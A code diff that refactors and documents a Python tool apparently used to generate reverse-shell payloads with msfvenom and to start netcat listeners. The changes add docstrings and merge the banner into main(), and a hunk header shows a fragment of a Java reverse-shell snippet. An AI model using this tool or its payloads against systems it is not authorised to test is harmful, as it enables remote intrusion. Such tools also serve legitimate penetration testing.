@@ -48,11 +48,22 @@ reset_color = "\033[0m"
 
 
 def signal_handler(sig, frame):
+    """Exit gracefully on signals."""
     print("\nBye!")
     sys.exit(1)
 
 
-def ask_listener():
+def ask_listener() -> (str, int):
+    """
+    Ask for the appropriate listener and return the IP and port the user selected.
+
+    Returns
+    -------
+    str
+       The IP address the user selected
+    int
+        The port the user selected
+    """
     interfaces = netifaces.interfaces()
     ip_addrs = []
     for interface in interfaces:
@@ -359,6 +370,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 
 def payload():
+    """Create msfvenom payload and start a listener."""
     print(
         f"""{choice(color)}
                       _________________________________________________________
@@ -507,7 +519,9 @@ run -j"""
     Popen(command).communicate()
 
 
-def banner():
+def main():
+    """Handle arguments and invoke the appropriate functions."""
+    args = docopt(__doc__)
     print(
         choice(color)
         + """
@@ -520,11 +534,6 @@ def banner():
                          .:: Heavily modified by Jonas A. Wendorf ::.
 """
     )
-
-
-def main(arg):
-    args = docopt(__doc__)
-    banner()
     if args["shell"]:
         # Try to find correct command line arguments for nc version
         help_output, help_error = Popen(
@@ -544,4 +553,4 @@ def main(arg):
 
 if __name__ == "__main__":
     signal.signal(signal.SIGINT, signal_handler)
-    main(sys.argv[1:])
+    main()
